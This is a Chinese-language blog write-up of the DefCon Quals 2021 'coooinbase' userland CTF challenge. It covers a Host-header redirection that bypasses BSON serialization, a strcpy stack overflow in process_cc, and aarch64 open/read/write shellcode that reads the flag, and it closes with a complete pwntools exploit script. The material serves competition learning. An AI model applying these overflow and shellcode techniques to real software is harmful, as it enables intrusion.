@@ -1,0 +1,344 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>PWN掉一款小型开源OS——用户态利用 | Sung3r&#39;s Blog</title>
+  <meta name="author" content="sung3r">
+  
+  <meta name="description" content="DefCon Quals 2021 coooinbase的解题思路">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="PWN掉一款小型开源OS——用户态利用"/>
+  <meta property="og:site_name" content="Sung3r&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Sung3r&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-user"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> PWN掉一款小型开源OS——用户态利用</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> DefCon Quals 2021 coooinbase的解题思路
+		 </div> <!-- alert -->
+	  		
+
+	  <p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/242112" target="_blank" rel="noopener">PWN掉一款小型开源OS——用户态利用</a></p>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326290561-1621326290590.png" alt="title"><br>题目来源于DefCon Quals 2021的coooinbase二连pwn，第一部分是用户空间利用，第二部分是内核利用。本篇文章是coooinbase用户态pwn的解题思路。</p>
+<p>在Github上找到对应源码<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326380004-1621326380005.png" alt="title"></p>
+<p>这是一款极其精简的的OS，没有shell，甚至只实现了有限的几个系统调用，包括open、read、write等。在<code>coooinbase.bin</code>这个内核基础上，再跑着一个用户态进程<code>run</code>，以下是关于<code>run</code>这个用户态进程的pwn<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326468550-1621326468553.png" alt="title"></p>
+<h1 id="Ruby源码审计"><a href="#Ruby源码审计" class="headerlink" title="Ruby源码审计"></a>Ruby源码审计</h1><p>给了以下几个文件，执行<code>ruby x.rb</code>启动题目环境<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621329312675-1621329312678.png" alt="title"></p>
+<p>解压文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/dos</span><br><span class="line">sudo mount -o loop ./rootfs.img /tmp/dos</span><br><span class="line">file /tmp/dos/bin</span><br><span class="line">/tmp/dos/bin: PDP-11 kernel overlay</span><br><span class="line">cat /tmp/dos/flg</span><br><span class="line">OOO&#123;this_is_from_userland&#125;</span><br></pre></td></tr></table></figure>
+
+<p>x.rb，会对输入的<code>credit_card</code>进行校验，看下是否valid，可用<code>4485-7873-4804-0088</code>通过检查<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621584844106-1621584844111.png" alt="title"></p>
+<p>通过POST方法<code>/gen-bson</code>获取<code>cvv</code>、<code>expmonth</code>、<code>expyear</code>、<code>cardnumber</code>参数，序列化成bson数据，最后转成base64。但是，bson只能接受<code>0x0~0x7f</code>的utf-8数据，超出这个范围的byte数据会导致没法通过x.rb的check，这为后续构造rop带来困难。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621585746598-1621585746599.png" alt="title"></p>
+<p>将bson数据传给<code>/buy</code>这个POST方法，注意到<code>http://#{env[&#39;HTTP_HOST&#39;]}/gen-bson</code>的访问是通过<code>HTTP_HOST</code>参数，也就是能通过http header的<code>Host</code>参数去设置URI.parse的链接<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621586285293-1621586285294.png" alt="title"></p>
+<p>现在转而向我们搭建的http server去获取<code>gen-bson</code>这个文件或者接口，这样便能绕过bson序列化，直接将任意byte的base64数据喂给<code>x.sh</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -d &quot;cvc&#x3D;123&quot; http:&#x2F;&#x2F;localhost:4567&#x2F;buy -H &quot;Host: localhost:8080&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621589577381-1621589577384.png" alt="title"></p>
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>导入Ghidra，Language选择aarch64小端<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326644253-1621326644255.png" alt="title"></p>
+<p>读取喂入的base64数据，最多读512 bytes，然后base64 decode<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/23/1621753225863-1621753225864.png" alt="title"></p>
+<p>获取base64 decode后的bson数据，将bson数据复制到<code>payload_start</code>，分别获取bson的<code>CVC</code>、<code>MON</code>、<code>YR</code>、<code>CC</code>键值，其中<code>CC</code>是str类型，其余为num类型，最后输出<code>CC</code>的str内容<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/23/1621753383231-1621753383232.png" alt="title"></p>
+<p><code>process_cc</code>里有一处<code>strcpy</code>栈溢出，直接将<code>CC</code>字符串拷贝到栈上。由于栈空间是根据<code>CC</code>字符串串长度来动态扩展，下面需要分析bson数据结构。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621828397658-1621828397663.png" alt="title"></p>
+<h1 id="BSON数据结构"><a href="#BSON数据结构" class="headerlink" title="BSON数据结构"></a>BSON数据结构</h1><p>接下来分析一下bson数据结构，通过以下脚本生成bson序列化数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import bson</span><br><span class="line"></span><br><span class="line">obj &#x3D; &#123;</span><br><span class="line">    &#39;CVC&#39;: 1111,</span><br><span class="line">    &#39;MON&#39;: 11,</span><br><span class="line">    &#39;CC&#39;: &quot;AAAAAAAAAAAAAAAAAAAAAA&quot;,</span><br><span class="line">    &#39;YR&#39;: 1111</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bs &#x3D; bson.dumps(obj)</span><br><span class="line">print(hexdump(bs))</span><br></pre></td></tr></table></figure>
+
+<p>bson数据有几个重要结构：<br>1.开始的4个byte，表示整个bson数据的总长度；<br>2.<code>\x10</code>、<code>\x02</code>表示这个key对应存放的是num、str类型的数据；<br>3.key和value之间用<code>\x00</code>分隔；<br>4.str类型的数据，有一个额外4个byte的数值指示value的长度。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/23/1621761811621-1621761811623.png" alt="title"></p>
+<p>现在便可构造bson数据结构，bson结构最后有个<code>\x00</code>，需要先去掉。然后拼接上<code>CC</code>结构，<code>CC</code>长度为<code>字符串长度+1</code>，最后1 byte为<code>\x00</code>。另外，bson结构结束符为<code>\x00</code>，需要在最后补上。注意，<code>CVC</code>是信用卡的后三码，这里指定为三位数字。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>: <span class="number">111</span>,</span><br><span class="line">    <span class="string">'MON'</span>: <span class="number">11</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x17</span>)</span><br><span class="line">bs += <span class="string">b'C'</span>*<span class="number">22</span> + <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hexdump(bs))</span></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h1><p>编辑<code>x.sh</code>，增加<code>-s -S</code>参数，开启调试接口并在内核启动时挂起</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-aarch64 -s -S -machine virt -cpu cortex-a57 -smp 1 -m 64M -nographic -serial mon:stdio -monitor none -kernel coooinbase.bin -drive if&#x3D;pflash,format&#x3D;raw,file&#x3D;rootfs.img,unit&#x3D;1,readonly</span><br></pre></td></tr></table></figure>
+
+<p>现将<code>AAAAA...</code>串的base64存到payload文件，执行<code>./x.sh &lt; payload</code>喂入数据<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/23/1621760451397-1621760451400.png" alt="title"></p>
+<p>userland程序装载地址为<code>0x0</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/23/1621751253322-1621751253348.png" alt="title"></p>
+<p>喂入构造好的bson base64数据<code>python solve.py | x.sh</code>，断在strcpy处。现在程序将<code>AAAAAAA...</code>串拷贝到process_cc栈上<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621830345153-1621830345155.png" alt="title"></p>
+<p>但此处的栈会根据bson <code>CC</code>结构里的4个byte长度去动态扩展栈空间，因而没法溢出到返回地址<code>0xf958</code>。但我们可以通过修改这4个byte长度结构去绕过，给出一个较小的长度与一个较长的字符串，便能覆盖<code>process_cc</code>的返回地址<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621830524434-1621830524437.png" alt="title"></p>
+<p>返回地址已被覆盖为<code>AAAAAAAA</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621830933452-1621830933454.png" alt="title"></p>
+<p>成功劫持了PC<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621830970958-1621830970958.png" alt="title"></p>
+<h1 id="Hijack-to-ORW"><a href="#Hijack-to-ORW" class="headerlink" title="Hijack to ORW"></a>Hijack to ORW</h1><p>由于OS内核并没有PIE、NX、Canary等保护，可以跳回栈上执行shellcode。同时，OS并未实现<code>execve</code>等pop shell系统调用，只能通过orw读flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'''ldr x0,=0x676c662f // /flg</span></span><br><span class="line"><span class="string">mov x1, 0x0        // open mode</span></span><br><span class="line"><span class="string">stp x0, x1, [sp]</span></span><br><span class="line"><span class="string">mov x0, sp</span></span><br><span class="line"><span class="string">mov x5, 0x340      // SYS_open</span></span><br><span class="line"><span class="string">blr  x5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov x1, 0xf940     // buf</span></span><br><span class="line"><span class="string">mov x2, 0x36       // size</span></span><br><span class="line"><span class="string">mov x5, 0x34c      // SYS_read</span></span><br><span class="line"><span class="string">blr  x5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov x0, 0xf940     // buf</span></span><br><span class="line"><span class="string">mov x5, 0x310      // SYS_write</span></span><br><span class="line"><span class="string">blr  x5'''</span></span><br></pre></td></tr></table></figure>
+
+<p><code>strcpy</code>对<code>\x00</code>截断，需要找另外一处存放有shellcode的内存空间<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621832077070-1621832077071.png" alt="title"></p>
+<p>注意到main方法中的base64_decode会将decode后的bson数据存放到一个栈地址上，返回到此处就行<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621832830793-1621832830794.png" alt="title"></p>
+<p>shellcode布置在<code>0xfc46</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621833447887-1621833447890.png" alt="title"></p>
+<p>将<code>process_cc</code>返回地址覆盖为<code>0xfc46</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621833493928-1621833493931.png" alt="title"></p>
+<p>get flag~<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621833562315-1621833562316.png" alt="title"></p>
+<h1 id="Script"><a href="#Script" class="headerlink" title="Script"></a>Script</h1><p>完整EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import bson</span><br><span class="line"></span><br><span class="line">context.arch &#x3D; &#39;aarch64&#39;</span><br><span class="line"></span><br><span class="line">obj &#x3D; &#123;</span><br><span class="line">    &#39;CVC&#39;: 111,</span><br><span class="line">    &#39;MON&#39;: 11,</span><br><span class="line">    &#39;YR&#39;: 2021</span><br><span class="line">&#125;</span><br><span class="line">bs &#x3D; bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs &#x3D; bs[:-1]</span><br><span class="line">bs +&#x3D; b&#39;\x02&#39;</span><br><span class="line">bs +&#x3D; b&#39;CC&#39;</span><br><span class="line">bs +&#x3D; b&#39;\x00&#39;</span><br><span class="line">bs +&#x3D; p32(0x10)</span><br><span class="line">bs +&#x3D; b&#39;A&#39;*(0x18)</span><br><span class="line">bs +&#x3D; p64(0xfc46)#ret addr</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &#39;&#39;&#39;ldr x0,&#x3D;0x676c662f &#x2F;&#x2F; &#x2F;flg</span><br><span class="line">mov x1, 0x0        &#x2F;&#x2F; open mode</span><br><span class="line">stp x0, x1, [sp]</span><br><span class="line">mov x0, sp</span><br><span class="line">mov x5, 0x340      &#x2F;&#x2F; SYS_open</span><br><span class="line">blr  x5</span><br><span class="line"></span><br><span class="line">mov x1, 0xf940     &#x2F;&#x2F; buf</span><br><span class="line">mov x2, 0x36       &#x2F;&#x2F; size</span><br><span class="line">mov x5, 0x34c      &#x2F;&#x2F; SYS_read</span><br><span class="line">blr  x5</span><br><span class="line"></span><br><span class="line">mov x0, 0xf940     &#x2F;&#x2F; buf</span><br><span class="line">mov x5, 0x310      &#x2F;&#x2F; SYS_write</span><br><span class="line">blr  x5&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; asm(shellcode)</span><br><span class="line">bs +&#x3D; payload + b&#39;\x00&#39;</span><br><span class="line">bs +&#x3D; b&#39;\x00&#39;</span><br><span class="line"></span><br><span class="line">#print(hexdump(bs))</span><br><span class="line">print(b64e(bs)+&#39; &#39;)</span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/06/26/PWN%E6%8E%89%E4%B8%80%E6%AC%BE%E5%B0%8F%E5%9E%8B%E5%BC%80%E6%BA%90OS%E2%80%94%E2%80%94%E7%94%A8%E6%88%B7%E6%80%81%E5%88%A9%E7%94%A8/" class="leancloud-visitors view" data-flag-title="PWN掉一款小型开源OS——用户态利用">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/06/26/PWN掉一款小型开源OS——续篇：内核态PWN/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/06/26/借助DefCon-Quals-2021的mooosl学习musl-mallocng（漏洞利用篇）/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-06-26 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/NBOS/">NBOS<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/解题思路/">解题思路<span>8</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Ruby源码审计"><span class="toc-article-text">Ruby源码审计</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#静态分析"><span class="toc-article-text">静态分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#BSON数据结构"><span class="toc-article-text">BSON数据结构</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Debug"><span class="toc-article-text">Debug</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Hijack-to-ORW"><span class="toc-article-text">Hijack to ORW</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Script"><span class="toc-article-text">Script</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 sung3r's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
